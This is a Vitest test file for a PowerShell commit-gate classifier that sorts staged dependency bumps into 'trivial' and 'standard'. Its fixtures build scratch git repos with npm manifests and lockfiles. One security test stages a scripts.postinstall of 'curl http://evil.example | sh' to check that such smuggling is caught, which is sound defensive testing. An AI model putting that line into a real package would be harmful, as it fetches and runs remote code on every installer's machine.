// tests/classify-trivial-commit.test.js
// Vitest tests for tools/classify-trivial-commit.ps1 (#448): classifier
// fixtures (AC1-5, AC13-16) and the drift guard (AC12). Hook-integration
// (AC6-9) and doc reconciliation (AC17) live in
// tests/commit-gate-trivial-dep-bump.test.js. Windows PowerShell 5.1 is the
// launcher on win32; pwsh elsewhere.
'use strict';

const { execFileSync, spawnSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const PS = process.platform === 'win32' ? 'powershell' : 'pwsh';

let launcherMissing = false;
try {
  execFileSync(PS, ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', 'exit 0']);
} catch (e) {
  if (e.code === 'ENOENT') {
    launcherMissing = true;
  }
}

const REPO_ROOT = path.resolve(__dirname, '..');
const SCRIPT = path.join(REPO_ROOT, 'tools', 'classify-trivial-commit.ps1');

function git(cwd, args) {
  const r = spawnSync('git', args, { cwd, encoding: 'utf8' });
  if (r.status !== 0) {
    throw new Error(`git ${args.join(' ')} failed in ${cwd}:\n${r.stderr}`);
  }
  return r.stdout;
}

// A scratch repo whose HEAD commit carries a manifest with the given deps.
function makeRepo(headDeps) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'trivial-commit-'));
  git(dir, ['init', '-q']);
  git(dir, ['config', 'user.name', 'test']);
  git(dir, ['config', 'user.email', 'test@example.invalid']);
  writeManifest(dir, headDeps);
  fs.writeFileSync(path.join(dir, 'package-lock.json'), '{}\n');
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'seed']);
  return dir;
}

function writeManifest(dir, deps) {
  const manifest = {
    name: 'fixture',
    version: '1.0.0',
    dependencies: deps.dependencies || {},
    devDependencies: deps.devDependencies || {},
  };
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(manifest, null, 2) + '\n');
}

function stagePackageJson(dir, deps) {
  writeManifest(dir, deps);
  git(dir, ['add', 'package.json']);
}

function stageLockfile(dir, content) {
  fs.writeFileSync(path.join(dir, 'package-lock.json'), content || '{"changed":true}\n');
  git(dir, ['add', 'package-lock.json']);
}

// A scratch repo whose HEAD commit carries an explicit package-lock.json
// (unlike makeRepo, which always seeds the "{}\n" placeholder) -- needed for
// #467 cases where the lockfile's CONTENT at HEAD must already look like a
// real npm lockfile (a `packages` object) for the new condition-4 diff to
// have something real to compare against.
function makeRepoWithLockfile(headDeps, headLockfileContent) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'trivial-commit-'));
  git(dir, ['init', '-q']);
  git(dir, ['config', 'user.name', 'test']);
  git(dir, ['config', 'user.email', 'test@example.invalid']);
  writeManifest(dir, headDeps);
  fs.writeFileSync(path.join(dir, 'package-lock.json'), headLockfileContent);
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'seed']);
  return dir;
}

// Builds a real-shaped npm lockfile (lockfileVersion 3 `packages` map): a
// root "" entry mirroring the manifest's dependencies/devDependencies, plus
// one node_modules/<name> entry per pkgVersions key. #467's condition 4
// diffs exactly this shape, so fixtures must use it -- not the `{}` /
// `{"changed":true}` placeholders #448's tests used (those never reached the
// lockfile's content, since #448 only ever checked its path).
function makeLockfile(rootDeps, rootDevDeps, pkgVersions) {
  const root = { name: 'fixture', version: '1.0.0' };
  if (rootDeps && Object.keys(rootDeps).length) root.dependencies = rootDeps;
  if (rootDevDeps && Object.keys(rootDevDeps).length) root.devDependencies = rootDevDeps;
  const packages = { '': root };
  for (const [name, version] of Object.entries(pkgVersions || {})) {
    packages[`node_modules/${name}`] = {
      version,
      resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
      integrity: `sha512-fixture-${name}-${version}`,
    };
  }
  return (
    JSON.stringify({ name: 'fixture', version: '1.0.0', lockfileVersion: 3, packages }, null, 2) +
    '\n'
  );
}

// Raw-manifest helpers: write a fully-specified package.json object so a
// fixture can carry arbitrary top-level fields (scripts, bin, main, ...),
// used to prove a version bump smuggling a non-dep change is `standard`.
function makeRepoRaw(headManifest) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'trivial-commit-'));
  git(dir, ['init', '-q']);
  git(dir, ['config', 'user.name', 'test']);
  git(dir, ['config', 'user.email', 'test@example.invalid']);
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(headManifest, null, 2) + '\n');
  fs.writeFileSync(path.join(dir, 'package-lock.json'), '{}\n');
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'seed']);
  return dir;
}

function stageRawManifest(dir, manifest) {
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(manifest, null, 2) + '\n');
  git(dir, ['add', 'package.json']);
}

function run(dir) {
  const r = spawnSync(PS, ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', SCRIPT], {
    cwd: dir,
    encoding: 'utf8',
  });
  return {
    status: r.status === null ? 1 : r.status,
    stdout: (r.stdout || '').trim(),
    stderr: r.stderr || '',
  };
}

const maybeDescribe = launcherMissing
  ? describe.skip.bind(describe, `${PS} not found — skipping classify-trivial-commit tests`)
  : describe;

maybeDescribe('classify-trivial-commit.ps1', () => {
  it('AC1: express minor bump, package.json + lockfile only -> trivial', () => {
    const dir = makeRepoWithLockfile(
      { dependencies: { express: '^4.21.2' } },
      makeLockfile({ express: '^4.21.2' }, {}, { express: '4.21.2' })
    );
    stagePackageJson(dir, { dependencies: { express: '^4.22.2' } });
    stageLockfile(dir, makeLockfile({ express: '^4.22.2' }, {}, { express: '4.22.2' }));
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('trivial');
  }, 30000);

  it('AC2: sharp patch bump (wedding-critical) -> standard', () => {
    const dir = makeRepo({ dependencies: { sharp: '^0.33.0' } });
    stagePackageJson(dir, { dependencies: { sharp: '^0.33.1' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC3: express major bump -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    stagePackageJson(dir, { dependencies: { express: '^5.0.0' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC4: package.json + package-lock.json + src/app.js staged -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    stagePackageJson(dir, { dependencies: { express: '^4.22.2' } });
    stageLockfile(dir);
    fs.mkdirSync(path.join(dir, 'src'));
    fs.writeFileSync(path.join(dir, 'src', 'app.js'), '// x\n');
    git(dir, ['add', 'src/app.js']);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC5: only package-lock.json staged (lockfile-only diff) -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC13: pinned "4.21.2" -> "5.0.0" (no caret) major detected through the adapter -> standard', () => {
    const dir = makeRepo({ dependencies: { lodash: '4.21.2' } });
    stagePackageJson(dir, { dependencies: { lodash: '5.0.0' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC14: express "^4.21.2" -> ">=4.22.2 <5.0.0" (unparsable range) -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    stagePackageJson(dir, { dependencies: { express: '>=4.22.2 <5.0.0' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC15: non-critical prod dep bumped to a pre-release "5.0.0-rc.1" -> standard', () => {
    const dir = makeRepo({ dependencies: { lodash: '4.21.2' } });
    stagePackageJson(dir, { dependencies: { lodash: '5.0.0-rc.1' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC16: package.json adds a new dep entry (with the lockfile), nothing else changes -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    stagePackageJson(dir, { dependencies: { express: '^4.21.2', lodash: '^4.17.21' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('edge: non-critical prod patch bump -> trivial', () => {
    const dir = makeRepoWithLockfile(
      { dependencies: { lodash: '^4.17.20' } },
      makeLockfile({ lodash: '^4.17.20' }, {}, { lodash: '4.17.20' })
    );
    stagePackageJson(dir, { dependencies: { lodash: '^4.17.21' } });
    stageLockfile(dir, makeLockfile({ lodash: '^4.17.21' }, {}, { lodash: '4.17.21' }));
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('trivial');
  }, 30000);

  it('edge: dev-dependency major bump -> trivial (dev bumps are always auto)', () => {
    const dir = makeRepoWithLockfile(
      { devDependencies: { eslint: '^8.0.0' } },
      makeLockfile({}, { eslint: '^8.0.0' }, { eslint: '8.0.0' })
    );
    stagePackageJson(dir, { devDependencies: { eslint: '^9.0.0' } });
    stageLockfile(dir, makeLockfile({}, { eslint: '^9.0.0' }, { eslint: '9.0.0' }));
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('trivial');
  }, 30000);

  it('edge: no staged changes at all -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('edge: dep removed from package.json (not a version bump) -> standard', () => {
    const dir = makeRepo({ dependencies: { express: '^4.21.2', lodash: '^4.17.21' } });
    stagePackageJson(dir, { dependencies: { express: '^4.21.2' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  // Security guard (round-2 review): an auto-tier version bump smuggling an
  // install-time code change (scripts.postinstall) in the SAME package.json
  // edit must be `standard` -- a Dependabot version bump never carries a
  // scripts change, so allowing it breaks the waiver's
  // "indistinguishable-from-Dependabot" safety rationale.
  it('security: express minor bump + added scripts.postinstall -> standard', () => {
    const dir = makeRepoRaw({
      name: 'fixture',
      version: '1.0.0',
      dependencies: { express: '^4.21.2' },
      devDependencies: {},
    });
    stageRawManifest(dir, {
      name: 'fixture',
      version: '1.0.0',
      dependencies: { express: '^4.22.2' },
      devDependencies: {},
      scripts: { postinstall: 'curl http://evil.example | sh' },
    });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  // Security guard: an auto-tier bump that also changes a top-level `bin`
  // (an install-time executable pointer) must be `standard`.
  it('security: express minor bump + changed bin -> standard', () => {
    const dir = makeRepoRaw({
      name: 'fixture',
      version: '1.0.0',
      bin: './cli-old.js',
      dependencies: { express: '^4.21.2' },
      devDependencies: {},
    });
    stageRawManifest(dir, {
      name: 'fixture',
      version: '1.0.0',
      bin: './cli-new.js',
      dependencies: { express: '^4.22.2' },
      devDependencies: {},
    });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  // Complement to the union-loop rework: an UNCHANGED dep carrying a
  // non-normalizable range (a git URL) alongside a real auto-tier bump does
  // NOT force `standard` -- only the CHANGED version is classified.
  it('unchanged non-normalizable dep (git URL) alongside a real bump -> trivial', () => {
    const headDeps = { express: '^4.21.2', tool: 'git+https://github.com/x/tool.git#v1' };
    const stagedDeps = { express: '^4.22.2', tool: 'git+https://github.com/x/tool.git#v1' };
    const dir = makeRepoWithLockfile(
      { dependencies: headDeps },
      makeLockfile(headDeps, {}, { express: '4.21.2', tool: '1.0.0' })
    );
    stagePackageJson(dir, { dependencies: stagedDeps });
    stageLockfile(dir, makeLockfile(stagedDeps, {}, { express: '4.22.2', tool: '1.0.0' }));
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('trivial');
  }, 30000);

  // #467: the lockfile's CONTENT, not just its path, is now examined. These
  // cases exercise condition 4 directly -- AC1/AC2 as specified in issue #467.
  it('AC1 (#467): manifest bumps a dev dep, but the lockfile also repins an untouched wedding-critical dep -> standard', () => {
    const headDeps = { dependencies: { sharp: '^0.33.0' }, devDependencies: { eslint: '^8.0.0' } };
    const dir = makeRepoWithLockfile(
      headDeps,
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.0' }, { sharp: '0.33.0', eslint: '8.0.0' })
    );
    // Manifest: only eslint bumps (dev patch, auto-class); sharp untouched.
    stagePackageJson(dir, {
      dependencies: { sharp: '^0.33.0' },
      devDependencies: { eslint: '^8.0.1' },
    });
    // Lockfile: eslint's bump is reflected correctly, but sharp is ALSO
    // repinned even though package.json never touched it -- exactly the
    // smuggling vector #467 closes.
    stageLockfile(
      dir,
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.1' }, { sharp: '0.33.1', eslint: '8.0.1' })
    );
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('AC2 (#467): lockfile changes confined to the manifest-bumped dep -> trivial', () => {
    const headDeps = { dependencies: { sharp: '^0.33.0' }, devDependencies: { eslint: '^8.0.0' } };
    const dir = makeRepoWithLockfile(
      headDeps,
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.0' }, { sharp: '0.33.0', eslint: '8.0.0' })
    );
    stagePackageJson(dir, {
      dependencies: { sharp: '^0.33.0' },
      devDependencies: { eslint: '^8.0.1' },
    });
    // sharp's node_modules entry and root dependency stanza are byte-identical
    // to HEAD; only eslint's own entries move -- the waiver's intended case.
    stageLockfile(
      dir,
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.1' }, { sharp: '0.33.0', eslint: '8.0.1' })
    );
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('trivial');
  }, 30000);

  it('#467: a lockfile with no top-level packages object (old/unrecognized shape) -> standard, fail closed', () => {
    // Reuses the original placeholder helpers unmodified: HEAD lockfile is
    // "{}\n" (makeRepo) and the staged lockfile is the default
    // '{"changed":true}\n" (stageLockfile with no content arg) -- neither has
    // a `packages` object, which is exactly the "content never examined"
    // shape #467 exists to stop trusting.
    const dir = makeRepo({ dependencies: { express: '^4.21.2' } });
    stagePackageJson(dir, { dependencies: { express: '^4.22.2' } });
    stageLockfile(dir);
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('security (#467): lockfile root entry smuggles a non-dependency field -> standard', () => {
    const dir = makeRepoWithLockfile(
      { dependencies: { lodash: '^4.17.20' } },
      makeLockfile({ lodash: '^4.17.20' }, {}, { lodash: '4.17.20' })
    );
    stagePackageJson(dir, { dependencies: { lodash: '^4.17.21' } });
    const lock = JSON.parse(makeLockfile({ lodash: '^4.17.21' }, {}, { lodash: '4.17.21' }));
    // A root-entry field the manifest-diff check (condition 2) never looks
    // at, since it only inspects package.json -- the lockfile's own copy of
    // the root project entry is a second, unguarded place the same kind of
    // smuggled field could hide.
    lock.packages[''].bin = './cli-new.js';
    stageLockfile(dir, JSON.stringify(lock, null, 2) + '\n');
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('#467: a new transitive package nested under an UNCHANGED dep -> standard', () => {
    const dir = makeRepoWithLockfile(
      { dependencies: { sharp: '^0.33.0' }, devDependencies: { eslint: '^8.0.0' } },
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.0' }, { sharp: '0.33.0', eslint: '8.0.0' })
    );
    stagePackageJson(dir, {
      dependencies: { sharp: '^0.33.0' },
      devDependencies: { eslint: '^8.0.1' },
    });
    const lock = JSON.parse(
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.1' }, { sharp: '0.33.0', eslint: '8.0.1' })
    );
    // A package added UNDER sharp's own subtree, but sharp itself never
    // changed -- transitive drift on an untouched dep, rejected.
    lock.packages['node_modules/sharp/node_modules/color'] = { version: '4.2.3' };
    stageLockfile(dir, JSON.stringify(lock, null, 2) + '\n');
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('standard');
  }, 30000);

  it('#467: a new transitive package nested under the CHANGED dep -> trivial', () => {
    const dir = makeRepoWithLockfile(
      { dependencies: { sharp: '^0.33.0' }, devDependencies: { eslint: '^8.0.0' } },
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.0' }, { sharp: '0.33.0', eslint: '8.0.0' })
    );
    stagePackageJson(dir, {
      dependencies: { sharp: '^0.33.0' },
      devDependencies: { eslint: '^8.0.1' },
    });
    const lock = JSON.parse(
      makeLockfile({ sharp: '^0.33.0' }, { eslint: '^8.0.1' }, { sharp: '0.33.0', eslint: '8.0.1' })
    );
    // A package added under eslint's OWN subtree -- eslint is the dep that
    // actually bumped, so a nested addition there is within bounds.
    lock.packages['node_modules/eslint/node_modules/globals'] = { version: '13.20.0' };
    stageLockfile(dir, JSON.stringify(lock, null, 2) + '\n');
    const r = run(dir);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('trivial');
  }, 30000);
});

// AC12: no second copy of the dep-tier rules.
describe('classify-trivial-commit.ps1 drift guard (#448 AC12)', () => {
  it('dot-sources the shared core instead of redefining $WeddingCritical', () => {
    const src = fs.readFileSync(SCRIPT, 'utf8');
    expect(src).not.toMatch(/\$WeddingCritical\s*=\s*@\(/);
    expect(src).toMatch(/classify-dep-pr-core\.ps1/);
    expect(src).toMatch(/Get-DepPrTier/);
  });
});
